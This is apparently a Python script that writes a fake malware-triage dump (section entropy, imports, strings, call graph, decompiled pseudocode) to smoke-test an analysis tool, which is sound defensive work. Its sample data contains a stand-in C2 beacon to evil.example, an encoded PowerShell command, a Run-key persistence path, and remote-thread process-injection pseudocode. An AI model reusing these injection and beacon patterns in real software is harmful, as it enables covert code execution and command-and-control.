"""Generate a synthetic triage dump to smoke-test host/q.py."""
import json, os, sys

out = sys.argv[1]
os.makedirs(os.path.join(out, "pseudocode"), exist_ok=True)

meta = {
    "input": r"C:\triage\out\work\sample.bin",
    "md5": "0" * 32, "sha256": "a" * 64,
    "bits": 64, "proc": "metapc",
    "filetype": "Portable executable for AMD64 (PE)",
    "entries": [{"ea": "0x140001000", "name": "start"}],
    "sections": [
        {"name": ".text", "start": "0x140001000", "end": "0x140009000", "size": 32768,
         "perm_x": True, "perm_w": False, "entropy": 6.41},
        {"name": ".rdata", "start": "0x140009000", "end": "0x14000b000", "size": 8192,
         "perm_x": False, "perm_w": False, "entropy": 4.92},
        {"name": ".pack", "start": "0x14000b000", "end": "0x140020000", "size": 86016,
         "perm_x": True, "perm_w": True, "entropy": 7.84},
    ],
    "imports_by_dll": {
        "KERNEL32.dll": ["CreateProcessW", "GetProcAddress", "LoadLibraryA",
                         "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
        "WININET.dll": ["InternetOpenW", "InternetConnectW", "HttpSendRequestW"],
        "ADVAPI32.dll": ["RegSetValueExW", "CryptEncrypt"],
    },
    "counts": {"functions": 1842, "strings": 3310, "imports": 11, "decompiled": 3},
    "hexrays": True, "ida_version": "9.2",
}

funcs = [
    {"ea": "0x140001000", "name": "start", "size": 96, "thunk": False, "lib": False,
     "nxrefs": 0, "apis": ["KERNEL32.dll!GetProcAddress"], "cats": ["dynresolve"],
     "strings": [], "score": 20, "decompiled": True},
    {"ea": "0x1400021a0", "name": "sub_1400021A0", "size": 612, "thunk": False, "lib": False,
     "nxrefs": 3, "apis": ["KERNEL32.dll!VirtualAllocEx", "KERNEL32.dll!WriteProcessMemory",
                           "KERNEL32.dll!CreateRemoteThread"],
     "cats": ["inject", "memory"], "strings": [], "score": 18, "decompiled": True},
    {"ea": "0x140003300", "name": "sub_140003300", "size": 420, "thunk": False, "lib": False,
     "nxrefs": 2, "apis": ["WININET.dll!InternetOpenW", "WININET.dll!HttpSendRequestW"],
     "cats": ["network"], "strings": ["http://evil.example/gate.php", "Mozilla/5.0 (compatible)"],
     "score": 16, "decompiled": True},
    {"ea": "0x140004100", "name": "sub_140004100", "size": 210, "thunk": False, "lib": False,
     "nxrefs": 1, "apis": ["ADVAPI32.dll!RegSetValueExW"], "cats": ["persist"],
     "strings": ["SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"], "score": 10},
    {"ea": "0x140005000", "name": "j_memcpy", "size": 6, "thunk": True, "lib": False,
     "nxrefs": 40, "apis": [], "cats": [], "strings": [], "score": 0},
]

strings = [
    {"ea": "0x140009100", "len": 28, "tags": ["url"], "refs": ["0x140003300"],
     "text": "http://evil.example/gate.php"},
    {"ea": "0x140009140", "len": 24, "tags": ["useragent"], "refs": ["0x140003300"],
     "text": "Mozilla/5.0 (compatible)"},
    {"ea": "0x140009200", "len": 46, "tags": ["regkey", "path"], "refs": ["0x140004100"],
     "text": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"},
    {"ea": "0x140009280", "len": 52, "tags": ["cmd"], "refs": [],
     "text": "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="},
    {"ea": "0x1400092e0", "len": 13, "tags": ["ip"], "refs": ["0x140003300"],
     "text": "185.0.113.42"},
    {"ea": "0x140009300", "len": 9, "tags": [], "refs": [], "text": "GetLastError"},
]

api_map = {
    "KERNEL32.dll!VirtualAllocEx": ["0x1400021a0"],
    "KERNEL32.dll!WriteProcessMemory": ["0x1400021a0"],
    "KERNEL32.dll!CreateRemoteThread": ["0x1400021a0"],
    "KERNEL32.dll!GetProcAddress": ["0x140001000", "0x1400021a0"],
    "WININET.dll!InternetOpenW": ["0x140003300"],
    "WININET.dll!HttpSendRequestW": ["0x140003300"],
    "ADVAPI32.dll!RegSetValueExW": ["0x140004100"],
}

callgraph = [
    ["0x140001000", "0x1400021a0"],
    ["0x140001000", "0x140004100"],
    ["0x1400021a0", "0x140003300"],
    ["0x1400021a0", "0x140005000"],
    ["0x140003300", "0x140005000"],
]

for name, obj in [("meta.json", meta), ("functions.json", funcs), ("strings.json", strings),
                  ("api_map.json", api_map), ("callgraph.json", callgraph)]:
    with open(os.path.join(out, name), "w", encoding="utf-8") as fh:
        json.dump(obj, fh, indent=1)

bodies = {
    "0x1400021a0": """// injection routine
__int64 sub_1400021A0(HANDLE hProc, void *payload, size_t len) {
  void *rb = VirtualAllocEx(hProc, 0i64, len, 0x3000u, 0x40u);
  if (!rb) return 0i64;
  WriteProcessMemory(hProc, rb, payload, len, 0i64);
  return (__int64)CreateRemoteThread(hProc, 0i64, 0, rb, 0i64, 0, 0i64);
}""",
    "0x140003300": """// C2 beacon
int sub_140003300(void) {
  HINTERNET h = InternetOpenW(L"Mozilla/5.0 (compatible)", 0, 0i64, 0i64, 0);
  HINTERNET c = InternetConnectW(h, L"evil.example", 80, 0i64, 0i64, 3u, 0, 0i64);
  return HttpSendRequestW(c, 0i64, 0, 0i64, 0);
}""",
    "0x140001000": """void start(void) {
  resolve_imports();
  sub_1400021A0(GetCurrentProcess(), &payload, 0x4000u);
  sub_140004100();
}""",
}
for ea, body in bodies.items():
    f = next(x for x in funcs if x["ea"] == ea)
    with open(os.path.join(out, "pseudocode", "%s.c" % ea), "w", encoding="utf-8") as fh:
        fh.write("// %s  %s  score=%d\n// cats: %s\n// apis: %s\n\n%s\n"
                 % (ea, f["name"], f["score"], ",".join(f["cats"]), ", ".join(f["apis"]), body))
print("fake dump written to", out)
